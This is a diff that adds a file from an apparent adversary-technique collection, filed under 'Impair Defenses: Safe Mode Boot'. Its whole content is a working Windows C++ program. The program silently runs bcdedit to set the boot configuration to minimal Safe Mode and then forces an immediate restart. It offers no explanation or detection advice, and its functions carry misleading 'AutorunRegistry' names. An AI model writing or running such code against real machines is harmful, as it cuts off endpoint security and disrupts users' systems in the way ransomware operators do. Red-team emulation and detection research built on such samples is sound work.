@@ -1,0 +1,53 @@
+---
+title: ".009.Safe Mode Boot"
+folder: "07. Defense Evasion/T1562 Impair Defenses"
+---
+
+
+
+
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+
+
+void AutorunRegistryBackground4() {
+
+    const char* command = "cmd.exe /c bcdedit /set {current} safeboot minimal";
+    STARTUPINFOA si = {};
+    si.cb = sizeof(STARTUPINFOA);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    PROCESS_INFORMATION pi;
+
+
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+}
+void AutorunRegistryBackground5() {
+
+    const char* command = "shutdown /r /t 0";
+    STARTUPINFOA si = {};
+    si.cb = sizeof(STARTUPINFOA);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    PROCESS_INFORMATION pi;
+
+
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+}
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+    AutorunRegistryBackground4();
+    AutorunRegistryBackground5();
+    return 0;
+}
